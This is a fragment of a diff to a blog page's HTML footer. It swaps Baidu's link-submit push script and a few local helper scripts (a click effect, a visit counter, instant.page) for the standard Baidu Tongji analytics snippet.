-        if (curProtocol === 'https') {
-            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
-        } else {
-            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
-        }
+    <script defer>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?d8cb5311ff5a7a66ad88e94f5290da89";
         var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(bp, s);
-    })();
-</script>
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
 
-    
-    <script src="/libs/others/clicklove.js" async="async"></script>
-    
-    
-    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
-    
+  
 
-    
+  
 
-    
+  
 
-    
+  
 
-    
+  
 
-    
 
-    
-    <script src="/libs/instantpage/instantpage.js" type="module"></script>
-    
+
+
 
 </body>
-
 </html>
